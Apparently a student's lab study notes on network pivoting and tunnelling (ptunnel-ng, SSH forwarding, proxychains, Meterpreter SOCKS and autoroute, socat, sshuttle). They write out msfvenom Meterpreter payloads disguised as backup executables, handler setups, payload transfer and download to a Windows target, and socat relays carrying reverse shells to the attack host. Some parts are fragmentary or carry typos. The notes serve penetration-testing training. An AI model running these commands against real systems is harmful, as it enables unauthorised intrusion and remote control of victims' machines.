# Basics 
- When used: you are on a windows machine and you want to route traffic from within side a network to your local device or ip address 
- Commonly used tools include proxychains 

- Remort Port Forwarding
  
- Local Port Forwarding

- Dynamic Port Forwarding 



**ptunnel-ng** 
- used to create tunnel between ubuntu server/target host and attack attack host  
**target-host**
```prompt:bash 
sudo ./ptunnel-ng -r10.129.202.64 -R22
# highlighted = ip of jump box you want to accept connections on or whatever is accessible from attacking machine
```
**attack-host** 
```bash prompt:kali
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

---
**Local Port Forward**
```bash prompt:kali
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

- Socks stands for Socket secure and is a protocol that helps communicate with servers where you have firewall restrictions in place. 
- Enabling dynamic port forwarding with ssh 
```bash prompt:kali
ssh -D 9050 ubuntu@10.129.202.64
```
- Scanning network with proxychains 
```bash hlt:172.16.5.1 prompt:kali
proxychains nmap -sV -sn 172.16.5.1-200c # 172.16.5.1 = found using ipconfig command 
```
```bash prompt:kali 
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

# Remote/Reverse Port Forwarding With Ssh
- Used if someone wants to gain reverse shell 
- Steps include creating windows payload with msfvenom 
- Starting multi/handler
- Transferring payload to pivot host 
- Start server on pivot host 
- Download payload on Windows Target
- Use SSH remote port forwarding to forward connections from Ubuntu server's port 8080 to our msfconsole's listener service on port 8000 

```bash prompt:kali hlt:172.16.5.129,10.129.10.15
msfvenom -p windows/x64/meterpreter/reverse_https lhost= 172.16.5.129 -f exe -o backupscript.exe LPORT=8080
use exploit/multi/handler 
scp backupscript.exe ubuntu@10.129.10.15:~/
```

```bash  prompt:ubuntu@10.129.10.15 hlt:172.16.5.129 imp
python -m http.server 8123
ipconfig 
172.16.5.129, 10.129.10.15, 127.0.0.1
```

```powershell prompt:C:\Users\htb-student\Downloads\
Invoke-WebRequest -Uri "http://172.16.5.129:8080/backupscript.exe" -outfile "C:\backupscript.exe"
```

```bash prompt:kali hlt:172.16.5.129,10.129.10.15
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.10.15 -vN
```

# Meterpreter Tunneling 

1. Create exploit 
2. Transfer to compromised system 
3. Use exploit/multi/handler, using same LPORT number that the created exploit has 
4. Set the correct payload 
5. Run the exploit on the compromised system
6. Background session and configure auxiliary/server/socks_proxy

```
use auxiliary/server/socks_proxy 
set SRVPORT 9050 
set SRVHOST 0.0.0.0
set version 4a 
run 


set SESSSION 1 
set SUBNET 
run 


use post/multi/manage/autoroute
Run desired commands with proxychains 

```

1. Attach to session and use autoroute to add routes to the network 

```bash 
use post/multi/manage/autoroute
set SESSION 1 

```

1. Scan target ip address using proxychains nmap 
2. Connect to device using proxychains xfreerdp 
# Socat Redirection with Reverse Shell 



``` prompt:kali 
ip addr 
10.10.14.18
```

``` bash prompt:ubuntu@Webserver hlt:10.10.14.18 
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80 #attack 
inet: 172.16.5.129
```

```bash prompt:kali 
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```


``` prompt:kali 
sudo msfconsole 
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https 
set lhost 0.0.0.0
set lport 80 
run 
```

# Socat Redirection 
- Windows server starts listener and binds to port 
- Socat will listen for incoming connections from windows device on port 8080 and forwards packets to windows server on port 8443 
- and this information will be sent to port 80 of attacking device 
10.10.14.18 = attack host ip address 
```bash prompt:kali 
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

``` prompt:C:\Windows\Users\htb-student
ipconfig 
172.16.5.19
```

```bash prompt:ubuntu@Webserver hlt:172.16.5.19 hlt:10.129.15.50
ip addr show 
10.129.15.50, 172.16.5.30 
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

```bash prompt:kali hlt:10.129.15.50
use exploit/multi/handler
set payload/generic/shell_reverse/
set payload windows/x64/meterpreter/bind_tcp 
set RHOST 10.129.15.50
set LPORT 8080 
run 
```

# Ssshuttle
- Removed need to configure proxychains 
- 172.16.5.0/23: internal ip address 
```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -
```

```
sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
```



# Rpivot 
- Used for socks tunnelling
```bash 



```

